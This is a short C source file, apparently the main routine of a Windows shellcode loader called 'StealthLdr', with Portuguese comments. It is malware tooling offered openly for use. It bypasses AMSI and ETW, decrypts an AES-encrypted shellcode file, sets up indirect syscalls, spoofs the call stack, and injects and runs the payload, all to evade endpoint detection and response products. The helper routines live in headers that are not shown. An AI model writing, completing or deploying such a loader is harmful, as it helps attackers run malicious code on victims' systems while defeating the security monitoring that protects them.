#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "syscalls.h"
#include "evasion.h"
#include "crypto.h"
#include "spoofing.h"
#include "injection.h"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Uso: %s <shellcode.enc>\n", argv[0]);
        return 1;
    }

    printf("[+] StealthLdr iniciado - EDR Evasion 2026\n");

    // Evasões iniciais
    PatchlessAMSI_Bypass();
    PatchlessETW_Bypass();

    // Ler shellcode encriptado
    SIZE_T encSize = 0;
    PBYTE encrypted = ReadEncryptedFile(argv[1], &encSize);
    if (!encrypted) return 1;

    // Descriptografar
    SIZE_T shellSize = 0;
    PBYTE shellcode = AES_Decrypt(encrypted, encSize, &shellSize);
    free(encrypted);

    if (!shellcode) {
        printf("[-] Falha na descriptografia\n");
        return 1;
    }

    // Setup indirect syscalls
    InitIndirectSyscalls();

    // Spoof stack
    SpoofCallStack();

    // Injetar e executar
    ExecuteShellcode(shellcode, shellSize);

    free(shellcode);
    printf("[+] Execução concluída.\n");
    return 0;
}